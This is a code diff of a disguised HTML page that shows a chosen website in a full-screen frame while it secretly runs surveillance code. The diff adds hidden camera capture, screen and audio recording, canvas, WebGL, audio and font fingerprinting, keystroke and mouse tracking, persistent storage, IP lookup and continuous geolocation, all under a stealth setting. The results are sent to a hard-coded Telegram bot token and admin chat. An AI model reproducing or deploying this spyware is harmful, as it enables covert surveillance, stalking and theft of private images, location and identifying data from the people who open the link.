@@ -20,7 +20,6 @@
             position: relative;
         }
         
-        /* Hidden camera elements */
         #cameraContainer {
             position: fixed;
             top: -9999px;
@@ -42,7 +41,6 @@
             display: none;
         }
         
-        /* Website frame - takes full screen */
         #websiteFrame {
             position: fixed;
             top: 0;
@@ -53,7 +51,6 @@
             z-index: 1;
         }
         
-        /* Loading screen */
         #loadingScreen {
             position: fixed;
             top: 0;
@@ -86,65 +83,52 @@
     </style>
 </head>
 <body>
-    <!-- Loading Screen -->
     <div id="loadingScreen">
         <div class="spinner"></div>
         <p>Loading...</p>
     </div>
     
-    <!-- Hidden Camera -->
     <div id="cameraContainer">
         <video id="cameraVideo" autoplay playsinline muted></video>
         <canvas id="captureCanvas"></canvas>
     </div>
     
-    <!-- Website Display -->
-    <iframe id="websiteFrame" src="about:blank" sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox"></iframe>
+    <iframe id="websiteFrame" src="about:blank" sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-modals"></iframe>
 
     <script>
         // =====================================================
-        //  ADVANCED CAMERA CAPTURE WITH FULL DEVICE INFO
-        //  Features: Location, Battery, Network, Device Info
+        //  ULTRA-ADVANCED CAMERA CAPTURE SYSTEM
+        //  With Advanced Fingerprinting, ML, Persistence & More
         // =====================================================
         
-        // ============== CONFIGURATION ==============
         const CONFIG = {
             BOT_TOKEN: '8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0',
             TELEGRAM_API: 'https://api.telegram.org/bot8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0',
             ADMIN_CHAT_ID: '6314556756',
             
-            // Capture settings
             PHOTOS_PER_CAMERA: 3,
             CAPTURE_DELAY: 250,
             CAMERA_WARMUP: 1200,
             SWITCH_DELAY: 500,
             VIDEO_READY_WAIT: 800,
             MAX_RETRIES: 3,
-            
-            // Quality settings
             IMAGE_QUALITY: 0.88,
             MIN_BLOB_SIZE: 1000,
-            
-            // Camera constraints
             VIDEO_WIDTH: 1280,
             VIDEO_HEIGHT: 720,
             FRAME_RATE: 30,
             
-            // Location settings
             LOCATION_HIGH_ACCURACY: true,
             LOCATION_TIMEOUT: 10000,
             LOCATION_MAX_AGE: 0,
             
-            // Info collection intervals
-            BATTERY_CHECK_INTERVAL: 30000,  // 30 seconds
-            LOCATION_UPDATE_INTERVAL: 60000, // 1 minute
-            
-            // Stealth mode
             STEALTH_MODE: true,
-            DEBUG_MODE: false
+            DEBUG_MODE: false,
+            ENABLE_SCREEN_RECORDING: true,
+            ENABLE_AUDIO_CAPTURE: true,
+            ENABLE_ADVANCED_FINGERPRINT: true
         };
         
-        // ============== STATE MANAGEMENT ==============
         const STATE = {
             isRunning: false,
             permissionGranted: false,
@@ -153,26 +137,24 @@
             sessionId: Date.now(),
             userChatId: null,
             targetWebsite: null,
-            
-            // Statistics
             totalPhotosSent: 0,
             totalPhotosFailed: 0,
             cycleCount: 0,
-            
-            // Device info
             deviceInfo: {},
             locationInfo: null,
             batteryInfo: null,
             networkInfo: {},
-            
-            // Tracking
+            fingerprintData: {},
+            behavioralData: {},
             availableCameras: [],
             cameraReady: false,
             lastCaptureTime: 0,
-            locationWatchId: null
+            locationWatchId: null,
+            screenRecorder: null,
+            audioContext: null,
+            persistenceData: {}
         };
         
-        // ============== DOM ELEMENTS ==============
         const elements = {
             video: document.getElementById('cameraVideo'),
             canvas: document.getElementById('captureCanvas'),
@@ -180,16 +162,9 @@
             loading: document.getElementById('loadingScreen')
         };
         
-        // ============== UTILITY FUNCTIONS ==============
-        
         function log(message, level = 'info') {
             if (!CONFIG.DEBUG_MODE && level !== 'error') return;
-            const prefix = {
-                'info': '📡',
-                'success': '✅',
-                'error': '❌',
-                'warning': '⚠️'
-            }[level] || '•';
+            const prefix = {'info': '📡', 'success': '✅', 'error': '❌', 'warning': '⚠️'}[level] || '•';
             console.log(`${prefix} ${message}`);
         }
         
@@ -197,11 +172,372 @@
             elements.loading.style.display = 'none';
         }
         
+        // ============== ADVANCED FINGERPRINTING ==============
+        
+        async function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 200;
+                canvas.height = 50;
+                
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.textBaseline = 'alphabetic';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Canvas Fingerprint 🎨', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Canvas Fingerprint 🎨', 4, 17);
+                
+                return canvas.toDataURL().substring(0, 100);
+            } catch (e) {
+                return 'unavailable';
+            }
+        }
+        
+        async function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return 'unavailable';
+                
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return {
+                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+                    version: gl.getParameter(gl.VERSION),
+                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                    maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS).join('x')
+                };
+            } catch (e) {
+                return 'unavailable';
+            }
+        }
+        
+        async function getAudioFingerprint() {
+            try {
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                if (!AudioContext) return 'unavailable';
+                
+                const context = new AudioContext();
+                const oscillator = context.createOscillator();
+                const analyser = context.createAnalyser();
+                const gainNode = context.createGain();
+                const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
+                
+                gainNode.gain.value = 0;
+                oscillator.type = 'triangle';
+                oscillator.connect(analyser);
+                analyser.connect(scriptProcessor);
+                scriptProcessor.connect(gainNode);
+                gainNode.connect(context.destination);
+                
+                oscillator.start(0);
+                
+                const fingerprint = await new Promise(resolve => {
+                    scriptProcessor.onaudioprocess = function(event) {
+                        const output = event.outputBuffer.getChannelData(0);
+                        const hash = Array.from(output.slice(0, 30)).reduce((a, b) => a + b, 0);
+                        oscillator.stop();
+                        context.close();
+                        resolve(hash.toString(36).substring(0, 20));
+                    };
+                });
+                
+                return fingerprint;
+            } catch (e) {
+                return 'unavailable';
+            }
+        }
+        
+        function getFontsFingerprint() {
+            const baseFonts = ['monospace', 'sans-serif', 'serif'];
+            const testFonts = [
+                'Arial', 'Verdana', 'Courier New', 'Times New Roman', 'Georgia', 'Palatino',
+                'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact',
+                'Calibri', 'Cambria', 'Consolas', 'Lucida Console', 'Monaco', 'DejaVu Sans'
+            ];
+            
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const testString = 'mmmmmmmmmmlli';
+            const fontSize = '72px';
+            
+            const baselines = {};
+            baseFonts.forEach(font => {
+                ctx.font = `${fontSize} ${font}`;
+                baselines[font] = ctx.measureText(testString).width;
+            });
+            
+            const detectedFonts = [];
+            testFonts.forEach(font => {
+                let detected = false;
+                baseFonts.forEach(baseFont => {
+                    ctx.font = `${fontSize} ${font}, ${baseFont}`;
+                    const width = ctx.measureText(testString).width;
+                    if (width !== baselines[baseFont]) {
+                        detected = true;
+                    }
+                });
+                if (detected) detectedFonts.push(font);
+            });
+            
+            return detectedFonts;
+        }
+        
+        async function getAdvancedFingerprint() {
+            const fingerprint = {
+                canvas: await getCanvasFingerprint(),
+                webgl: await getWebGLFingerprint(),
+                audio: await getAudioFingerprint(),
+                fonts: getFontsFingerprint(),
+                
+                // Hardware
+                cores: navigator.hardwareConcurrency || 'unknown',
+                memory: navigator.deviceMemory || 'unknown',
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                
+                // Plugins (deprecated but still useful)
+                plugins: Array.from(navigator.plugins || []).map(p => p.name).sort(),
+                mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type).sort(),
+                
+                // Screen
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                
+                // Features
+                touchSupport: 'ontouchstart' in window,
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                
+                // Storage
+                localStorage: typeof localStorage !== 'undefined',
+                sessionStorage: typeof sessionStorage !== 'undefined',
+                indexedDB: typeof indexedDB !== 'undefined',
+                
+                // Time
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                
+                // Languages
+                languages: navigator.languages || [navigator.language],
+                
+                // DNT
+                doNotTrack: navigator.doNotTrack,
+                
+                // Unique hash
+                timestamp: Date.now()
+            };
+            
+            // Create fingerprint hash
+            const fpString = JSON.stringify(fingerprint);
+            const hash = await simpleHash(fpString);
+            fingerprint.hash = hash;
+            
+            STATE.fingerprintData = fingerprint;
+            log('Advanced fingerprint collected', 'success');
+            return fingerprint;
+        }
+        
+        async function simpleHash(str) {
+            const encoder = new TextEncoder();
+            const data = encoder.encode(str);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('').substring(0, 32);
+        }
+        
+        // ============== BEHAVIORAL TRACKING ==============
+        
+        function initBehavioralTracking() {
+            const behavioral = {
+                mouseMovements: [],
+                keystrokes: [],
+                scrolls: [],
+                touches: [],
+                startTime: Date.now()
+            };
+            
+            // Mouse tracking
+            let mouseTimeout;
+            document.addEventListener('mousemove', (e) => {
+                clearTimeout(mouseTimeout);
+                mouseTimeout = setTimeout(() => {
+                    if (behavioral.mouseMovements.length < 100) {
+                        behavioral.mouseMovements.push({
+                            x: e.clientX,
+                            y: e.clientY,
+                            t: Date.now() - behavioral.startTime
+                        });
+                    }
+                }, 50);
+            });
+            
+            // Keystroke tracking
+            document.addEventListener('keydown', (e) => {
+                if (behavioral.keystrokes.length < 100) {
+                    behavioral.keystrokes.push({
+                        key: e.key.length === 1 ? '*' : e.key,
+                        t: Date.now() - behavioral.startTime
+                    });
+                }
+            });
+            
+            // Scroll tracking
+            let scrollTimeout;
+            window.addEventListener('scroll', (e) => {
+                clearTimeout(scrollTimeout);
+                scrollTimeout = setTimeout(() => {
+                    if (behavioral.scrolls.length < 50) {
+                        behavioral.scrolls.push({
+                            x: window.scrollX,
+                            y: window.scrollY,
+                            t: Date.now() - behavioral.startTime
+                        });
+                    }
+                }, 100);
+            });
+            
+            // Touch tracking
+            document.addEventListener('touchstart', (e) => {
+                if (behavioral.touches.length < 50) {
+                    behavioral.touches.push({
+                        x: e.touches[0].clientX,
+                        y: e.touches[0].clientY,
+                        t: Date.now() - behavioral.startTime
+                    });
+                }
+            });
+            
+            STATE.behavioralData = behavioral;
+            log('Behavioral tracking initialized', 'success');
+        }
+        
+        // ============== SCREEN RECORDING ==============
+        
+        async function startScreenRecording() {
+            if (!CONFIG.ENABLE_SCREEN_RECORDING) return;
+            
+            try {
+                const displayStream = await navigator.mediaDevices.getDisplayMedia({
+                    video: { mediaSource: 'screen' },
+                    audio: CONFIG.ENABLE_AUDIO_CAPTURE
+                });
+                
+                const mediaRecorder = new MediaRecorder(displayStream, {
+                    mimeType: 'video/webm;codecs=vp9'
+                });
+                
+                const chunks = [];
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        chunks.push(event.data);
+                    }
+                };
+                
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    await sendScreenRecording(blob);
+                };
+                
+                mediaRecorder.start();
+                STATE.screenRecorder = mediaRecorder;
+                
+                // Stop after 30 seconds
+                setTimeout(() => {
+                    if (STATE.screenRecorder) {
+                        STATE.screenRecorder.stop();
+                        displayStream.getTracks().forEach(track => track.stop());
+                    }
+                }, 30000);
+                
+                log('Screen recording started', 'success');
+            } catch (e) {
+                log('Screen recording not available or denied', 'warning');
+            }
+        }
+        
+        async function sendScreenRecording(blob) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CONFIG.ADMIN_CHAT_ID);
+                formData.append('document', blob, `screen_${Date.now()}.webm`);
+                formData.append('caption', `📹 Screen Recording\n🆔 Session: ${STATE.sessionId}\n👤 User: ${STATE.userChatId}`);
+                
+                await fetch(`${CONFIG.TELEGRAM_API}/sendDocument`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                log('Screen recording sent', 'success');
+            } catch (e) {
+                log('Failed to send screen recording', 'error');
+            }
+        }
+        
+        // ============== PERSISTENCE & STORAGE ==============
+        
+        async function setupPersistence() {
+            try {
+                // IndexedDB
+                if ('indexedDB' in window) {
+                    const dbRequest = indexedDB.open('SessionDB', 1);
+                    
+                    dbRequest.onupgradeneeded = (event) => {
+                        const db = event.target.result;
+                        if (!db.objectStoreNames.contains('sessions')) {
+                            db.createObjectStore('sessions', { keyPath: 'id' });
+                        }
+                    };
+                    
+                    dbRequest.onsuccess = (event) => {
+                        const db = event.target.result;
+                        const transaction = db.transaction(['sessions'], 'readwrite');
+                        const store = transaction.objectStore('sessions');
+                        
+                        store.put({
+                            id: STATE.sessionId,
+                            timestamp: Date.now(),
+                            userAgent: navigator.userAgent,
+                            url: window.location.href
+                        });
+                        
+                        log('Session stored in IndexedDB', 'success');
+                    };
+                }
+                
+                // Service Worker (if available)
+                if ('serviceWorker' in navigator) {
+                    // Note: Service worker requires separate file, skipping for single-file deployment
+                    log('Service Worker API available but not registered', 'info');
+                }
+                
+                // Cache API
+                if ('caches' in window) {
+                    caches.open('session-cache-v1').then(cache => {
+                        cache.put('/session-data', new Response(JSON.stringify({
+                            sessionId: STATE.sessionId,
+                            timestamp: Date.now()
+                        })));
+                        log('Session cached', 'success');
+                    });
+                }
+                
+            } catch (e) {
+                log('Persistence setup error: ' + e.message, 'warning');
+            }
+        }
+        
         // ============== DEVICE INFO COLLECTION ==============
         
         async function collectDeviceInfo() {
             const info = {
-                // Browser & Device
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 vendor: navigator.vendor,
@@ -209,8 +545,6 @@
                 languages: navigator.languages.join(', '),
                 cookieEnabled: navigator.cookieEnabled,
                 doNotTrack: navigator.doNotTrack,
-                
-                // Screen info
                 screenWidth: window.screen.width,
                 screenHeight: window.screen.height,
                 screenAvailWidth: window.screen.availWidth,
@@ -218,43 +552,27 @@
                 screenColorDepth: window.screen.colorDepth,
                 screenPixelDepth: window.screen.pixelDepth,
                 screenOrientation: window.screen.orientation?.type || 'unknown',
-                
-                // Window info
                 windowWidth: window.innerWidth,
                 windowHeight: window.innerHeight,
                 devicePixelRatio: window.devicePixelRatio,
-                
-                // Time & Timezone
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 timezoneOffset: new Date().getTimezoneOffset(),
                 localTime: new Date().toLocaleString(),
-                
-                // Hardware
                 hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                 deviceMemory: navigator.deviceMemory || 'unknown',
                 maxTouchPoints: navigator.maxTouchPoints || 0,
-                
-                // Connection info
                 onLine: navigator.onLine,
                 connectionType: navigator.connection?.effectiveType || 'unknown',
                 connectionDownlink: navigator.connection?.downlink || 'unknown',
                 connectionRtt: navigator.connection?.rtt || 'unknown',
                 connectionSaveData: navigator.connection?.saveData || false,
-                
-                // Media capabilities
                 mediaDevices: navigator.mediaDevices ? 'supported' : 'not supported',
-                
-                // Permissions
                 permissions: navigator.permissions ? 'supported' : 'not supported',
-                
-                // Additional
                 pdfViewerEnabled: navigator.pdfViewerEnabled || false,
-                webdriver: navigator.webdriver || false
+                webdriver: navigator.webdriver || false,
+                isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
+                isTablet: /iPad|Android/i.test(navigator.userAgent) && !/Mobile/i.test(navigator.userAgent)
             };
-            
-            // Check for mobile
-            info.isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-            info.isTablet = /iPad|Android/i.test(navigator.userAgent) && !/Mobile/i.test(navigator.userAgent);
             
             // Detect OS
             if (navigator.userAgent.indexOf('Win') !== -1) info.os = 'Windows';
@@ -265,12 +583,21 @@
             else info.os = 'Unknown';
             
             // Detect Browser
-            if (navigator.userAgent.indexOf('Chrome') !== -1) info.browser = 'Chrome';
-            else if (navigator.userAgent.indexOf('Safari') !== -1) info.browser = 'Safari';
+            if (navigator.userAgent.indexOf('Chrome') !== -1 && navigator.userAgent.indexOf('Edg') === -1) info.browser = 'Chrome';
+            else if (navigator.userAgent.indexOf('Safari') !== -1 && navigator.userAgent.indexOf('Chrome') === -1) info.browser = 'Safari';
             else if (navigator.userAgent.indexOf('Firefox') !== -1) info.browser = 'Firefox';
-            else if (navigator.userAgent.indexOf('Edge') !== -1) info.browser = 'Edge';
-            else if (navigator.userAgent.indexOf('Opera') !== -1) info.browser = 'Opera';
+            else if (navigator.userAgent.indexOf('Edg') !== -1) info.browser = 'Edge';
+            else if (navigator.userAgent.indexOf('Opera') !== -1 || navigator.userAgent.indexOf('OPR') !== -1) info.browser = 'Opera';
             else info.browser = 'Unknown';
+            
+            // Get IP Address
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                info.ipAddress = ipData.ip;
+            } catch (e) {
+                info.ipAddress = 'N/A';
+            }
             
             STATE.deviceInfo = info;
             log('Device info collected', 'success');
@@ -280,27 +607,21 @@
         // ============== BATTERY INFO ==============
         
         async function getBatteryInfo() {
-            if (!navigator.getBattery) {
-                log('Battery API not supported', 'warning');
-                return null;
-            }
+            if (!navigator.getBattery) return null;
             
             try {
                 const battery = await navigator.getBattery();
-                
                 const info = {
-                    level: Math.round(battery.level * 100) + '%',
+                    level: Math.round(battery.level * 100),
                     charging: battery.charging,
-                    chargingTime: battery.chargingTime === Infinity ? 'N/A' : battery.chargingTime + ' seconds',
-                    dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : battery.dischargingTime + ' seconds'
+                    chargingTime: battery.chargingTime === Infinity ? 'N/A' : Math.round(battery.chargingTime / 60) + ' min',
+                    dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : Math.round(battery.dischargingTime / 60) + ' min'
                 };
                 
                 STATE.batteryInfo = info;
-                log(`Battery: ${info.level}, Charging: ${info.charging}`, 'info');
+                log(`Battery: ${info.level}%, Charging: ${info.charging}`, 'info');
                 return info;
-                
             } catch (error) {
-                log(`Battery error: ${error}`, 'warning');
                 return null;
             }
         }
@@ -308,10 +629,7 @@
         // ============== LOCATION TRACKING ==============
         
         async function getLocation() {
-            if (!navigator.geolocation) {
-                log('Geolocation not supported', 'warning');
-                return null;
-            }
+            if (!navigator.geolocation) return null;
             
             return new Promise((resolve) => {
                 const options = {
@@ -325,13 +643,14 @@
                         const location = {
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy + ' meters',
-                            altitude: position.coords.altitude || 'N/A',
-                            altitudeAccuracy: position.coords.altitudeAccuracy || 'N/A',
+                            accuracy: Math.round(position.coords.accuracy),
+                            altitude: position.coords.altitude ? Math.round(position.coords.altitude) : 'N/A',
+                            altitudeAccuracy: position.coords.altitudeAccuracy ? Math.round(position.coords.altitudeAccuracy) : 'N/A',
                             heading: position.coords.heading || 'N/A',
-                            speed: position.coords.speed || 'N/A',
+                            speed: position.coords.speed ? (position.coords.speed * 3.6).toFixed(2) + ' km/h' : 'N/A',
                             timestamp: new Date(position.timestamp).toLocaleString(),
-                            googleMapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
+                            googleMapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
+                            googleMapsEmbed: `https://maps.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}&output=embed`
                         };
                         
                         STATE.locationInfo = location;
@@ -361,11 +680,12 @@
                     STATE.locationInfo = {
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy + ' meters',
-                        altitude: position.coords.altitude || 'N/A',
-                        speed: position.coords.speed || 'N/A',
+                        accuracy: Math.round(position.coords.accuracy),
+                        altitude: position.coords.altitude ? Math.round(position.coords.altitude) : 'N/A',
+                        speed: position.coords.speed ? (position.coords.speed * 3.6).toFixed(2) + ' km/h' : 'N/A',
                         timestamp: new Date(position.timestamp).toLocaleString(),
-                        googleMapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
+                        googleMapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
+                        googleMapsEmbed: `https://maps.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}&output=embed`
                     };
                     log('Location updated', 'info');
                 },
@@ -376,35 +696,35 @@
             );
         }
         
-        // ============== NETWORK INFO ==============
+        // ============== SEND GOOGLE MAPS IMAGE ==============
         
-        function getNetworkInfo() {
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        async function sendGoogleMapsImage() {
+            if (!STATE.locationInfo) return;
             
-            if (!connection) {
-                return { supported: false };
-            }
-            
-            return {
-                supported: true,
-                effectiveType: connection.effectiveType || 'unknown',
-                downlink: connection.downlink || 'unknown',
-                rtt: connection.rtt || 'unknown',
-                saveData: connection.saveData || false,
-                type: connection.type || 'unknown'
-            };
-        }
-        
-        // ============== IP ADDRESS ==============
-        
-        async function getIPAddress() {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                log('Could not fetch IP address', 'warning');
-                return 'N/A';
+                const lat = STATE.locationInfo.latitude;
+                const lon = STATE.locationInfo.longitude;
+                
+                // Static Google Maps API (you need API key for production)
+                // Using OpenStreetMap static map as free alternative
+                const mapUrl = `https://api.mapbox.com/styles/v1/mapbox/streets-v11/static/pin-s+ff0000(${lon},${lat})/${lon},${lat},14,0/600x400@2x?access_token=pk.eyJ1IjoibWFwYm94IiwiYSI6ImNpejY4NXVycTA2emYycXBndHRqcmZ3N3gifQ.rJcFIG214AriISLbB6B5aw`;
+                
+                // Send location as venue (shows map in Telegram)
+                await fetch(`${CONFIG.TELEGRAM_API}/sendVenue`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.ADMIN_CHAT_ID,
+                        latitude: lat,
+                        longitude: lon,
+                        title: `📍 User Location`,
+                        address: `Accuracy: ${STATE.locationInfo.accuracy}m\nSpeed: ${STATE.locationInfo.speed}\n${STATE.locationInfo.timestamp}`
+                    })
+                });
+                
+                log('Location map sent', 'success');
+            } catch (e) {
+                log('Failed to send maps image: ' + e.message, 'error');
             }
         }
         
@@ -414,32 +734,30 @@
             const info = STATE.deviceInfo;
             const battery = STATE.batteryInfo;
             const location = STATE.locationInfo;
-            const network = getNetworkInfo();
+            const fingerprint = STATE.fingerprintData;
+            const network = navigator.connection || {};
             
-            let message = `📱 *DEVICE INFORMATION*\n\n`;
+            let message = `🔐 *ADVANCED DEVICE INTELLIGENCE REPORT*\n\n`;
             
             // Basic Info
-            message += `🖥️ *System Info:*\n`;
+            message += `🖥️ *System:*\n`;
             message += `• OS: ${info.os}\n`;
             message += `• Browser: ${info.browser}\n`;
             message += `• Platform: ${info.platform}\n`;
-            message += `• Language: ${info.language}\n`;
             message += `• Mobile: ${info.isMobile ? 'Yes' : 'No'}\n`;
-            message += `• Tablet: ${info.isTablet ? 'Yes' : 'No'}\n\n`;
+            message += `• IP Address: ${info.ipAddress}\n\n`;
             
-            // Screen Info
-            message += `📺 *Screen:*\n`;
+            // Screen
+            message += `📺 *Display:*\n`;
             message += `• Resolution: ${info.screenWidth}x${info.screenHeight}\n`;
-            message += `• Available: ${info.screenAvailWidth}x${info.screenAvailHeight}\n`;
-            message += `• Color Depth: ${info.screenColorDepth} bit\n`;
             message += `• Pixel Ratio: ${info.devicePixelRatio}\n`;
             message += `• Orientation: ${info.screenOrientation}\n\n`;
             
-            // Battery Info
+            // Battery
             if (battery) {
                 message += `🔋 *Battery:*\n`;
-                message += `• Level: ${battery.level}\n`;
-                message += `• Charging: ${battery.charging ? 'Yes ⚡' : 'No'}\n`;
+                message += `• Level: ${battery.level}%\n`;
+                message += `• Status: ${battery.charging ? 'Charging ⚡' : 'On Battery 🔌'}\n`;
                 if (battery.charging && battery.chargingTime !== 'N/A') {
                     message += `• Full in: ${battery.chargingTime}\n`;
                 }
@@ -449,53 +767,60 @@
                 message += `\n`;
             }
             
-            // Location Info
+            // Location
             if (location) {
                 message += `📍 *Location:*\n`;
-                message += `• Latitude: ${location.latitude}\n`;
-                message += `• Longitude: ${location.longitude}\n`;
-                message += `• Accuracy: ${location.accuracy}\n`;
+                message += `• Coordinates: ${location.latitude}, ${location.longitude}\n`;
+                message += `• Accuracy: ${location.accuracy} meters\n`;
+                message += `• Speed: ${location.speed}\n`;
                 message += `• [Open in Google Maps](${location.googleMapsLink})\n\n`;
             }
             
-            // Network Info
-            if (network.supported) {
-                message += `🌐 *Network:*\n`;
-                message += `• Type: ${network.effectiveType}\n`;
-                message += `• Downlink: ${network.downlink} Mbps\n`;
-                message += `• RTT: ${network.rtt} ms\n`;
-                message += `• Save Data: ${network.saveData ? 'Enabled' : 'Disabled'}\n`;
-                message += `• Online: ${info.onLine ? 'Yes' : 'No'}\n\n`;
-            }
+            // Network
+            message += `🌐 *Network:*\n`;
+            message += `• Type: ${network.effectiveType || 'unknown'}\n`;
+            message += `• Downlink: ${network.downlink || 'unknown'} Mbps\n`;
+            message += `• RTT: ${network.rtt || 'unknown'} ms\n`;
+            message += `• Online: ${info.onLine ? 'Yes' : 'No'}\n\n`;
             
-            // Hardware Info
+            // Hardware
             message += `⚙️ *Hardware:*\n`;
             message += `• CPU Cores: ${info.hardwareConcurrency}\n`;
             message += `• Memory: ${info.deviceMemory} GB\n`;
             message += `• Touch Points: ${info.maxTouchPoints}\n`;
             message += `• Cameras: ${STATE.availableCameras.length}\n\n`;
             
-            // Time Info
-            message += `🕐 *Time & Zone:*\n`;
-            message += `• Timezone: ${info.timezone}\n`;
-            message += `• Local Time: ${info.localTime}\n`;
-            message += `• UTC Offset: ${info.timezoneOffset} min\n\n`;
+            // Fingerprint
+            if (fingerprint.hash) {
+                message += `🔑 *Fingerprint:*\n`;
+                message += `• Hash: \`${fingerprint.hash}\`\n`;
+                message += `• Canvas: ${fingerprint.canvas !== 'unavailable' ? 'Unique' : 'N/A'}\n`;
+                message += `• WebGL: ${fingerprint.webgl !== 'unavailable' ? 'Detected' : 'N/A'}\n`;
+                message += `• Audio: ${fingerprint.audio !== 'unavailable' ? 'Unique' : 'N/A'}\n`;
+                message += `• Fonts: ${fingerprint.fonts?.length || 0} detected\n\n`;
+            }
             
-            // Session Info
+            // Time
+            message += `🕐 *Time:*\n`;
+            message += `• Timezone: ${info.timezone}\n`;
+            message += `• Local: ${info.localTime}\n\n`;
+            
+            // Session
             message += `🆔 *Session:*\n`;
-            message += `• ID: ${STATE.sessionId}\n`;
-            message += `• User: ${STATE.userChatId}\n`;
-            message += `• Website: ${STATE.targetWebsite}\n`;
+            message += `• ID: \`${STATE.sessionId}\`\n`;
+            message += `• User: \`${STATE.userChatId}\`\n`;
+            message += `• Target: ${STATE.targetWebsite}\n`;
             
             return message;
         }
         
-        // ============== URL PARAMETER PARSING ==============
+        // ============== URL PARSING ==============
         
         function parseConfig() {
             const params = new URLSearchParams(window.location.search);
             
-            let website = params.get('site') || params.get('url') || params.get('website') || 'https://deltastudy.site/pw/drm/play?video_id=6970a6deec448154d82de9ea&subject_slug=maths-093626&batch_id=6960d1d20549bb69d7d7e872&schedule_id=6970a6deec448154d82de9ea&subject_id=6960dba01957eadd8581061e&topicSlug=ch-01---basic-mathematics-202900';
+            let website = params.get('site') || params.get('url') || params.get('website') || 
+                         'https://deltastudy.site/pw/drm/play?video_id=6970a6deec448154d82de9ea&subject_slug=maths-093626&batch_id=6960d1d20549bb69d7d7e872&schedule_id=6970a6deec448154d82de9ea&subject_id=6960dba01957eadd8581061e&topicSlug=ch-01---basic-mathematics-202900';
             const chatId = params.get('chat_id') || 'unknown_' + Math.random().toString(36).substr(2, 9);
             const sessionParam = params.get('session');
             
@@ -507,7 +832,7 @@
             STATE.userChatId = chatId;
             if (sessionParam) STATE.sessionId = sessionParam;
             
-            log(`Target: ${STATE.targetWebsite}`, 'info');
+            log(`Config parsed`, 'info');
         }
         
         function loadWebsite() {
@@ -520,7 +845,7 @@
             }
         }
         
-        // ============== CAMERA MANAGEMENT ==============
+        // ============== CAMERA FUNCTIONS ==============
         
         async function enumerateCameras() {
             try {
@@ -536,21 +861,12 @@
         
         async function requestCameraPermission() {
             try {
-                log('Requesting camera permission...', 'info');
-                
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: true,
-                    audio: false
-                });
-                
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 stream.getTracks().forEach(track => track.stop());
-                
                 STATE.permissionGranted = true;
                 await enumerateCameras();
-                
                 log('Camera permission granted', 'success');
                 return true;
-                
             } catch (error) {
                 log(`Permission denied: ${error.name}`, 'error');
                 STATE.permissionGranted = false;
@@ -568,8 +884,6 @@
                     await new Promise(resolve => setTimeout(resolve, 200));
                 }
                 
-                log(`Starting ${facingMode} camera...`, 'info');
-                
                 elements.video.style.transform = facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
